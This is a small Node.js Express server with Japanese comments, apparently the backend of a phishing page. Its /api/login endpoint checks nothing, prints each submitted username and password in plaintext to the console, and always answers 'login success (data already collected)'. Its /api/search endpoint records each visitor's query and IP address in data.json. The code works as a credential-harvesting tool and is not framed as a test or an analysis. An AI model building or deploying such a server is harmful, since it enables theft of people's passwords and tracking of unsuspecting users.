const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

// public フォルダを静的ファイルとして設定
app.use(express.static('public'));

// POSTデータを扱うためのミドルウェア
app.use(express.json());

// ログインAPIエンドポイント
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    console.log(`ログイン試行: ユーザー名 = ${username}, パスワード = ${password}`);
    res.status(200).send({ status: 'success', message: 'ログイン成功（データは収集済み）' });
});

// 検索APIエンドポイント
app.post('/api/search', (req, res) => {
    const { query, ip } = req.body;
    const timestamp = new Date().toISOString();
    const newEntry = { query, ip, timestamp };

    // `data.json`に保存
    const dataPath = path.join(__dirname, 'data.json');
    fs.readFile(dataPath, 'utf8', (err, data) => {
        if (err) {
            console.error('ファイル読み込みエラー:', err);
            return res.status(500).send({ status: 'error', message: 'データ保存に失敗しました' });
        }

        const jsonData = data ? JSON.parse(data) : [];
        jsonData.push(newEntry);

        fs.writeFile(dataPath, JSON.stringify(jsonData, null, 2), 'utf8', (writeErr) => {
            if (writeErr) {
                console.error('ファイル書き込みエラー:', writeErr);
                return res.status(500).send({ status: 'error', message: 'データ保存に失敗しました' });
            }

            console.log('新しい検索データが保存されました:', newEntry);
            res.status(200).send({ status: 'success', message: 'データ保存成功' });
        });
    });
});

// サーバー起動
app.listen(PORT, () => {
    console.log(`サーバーが起動しました: http://localhost:${PORT}`);
});
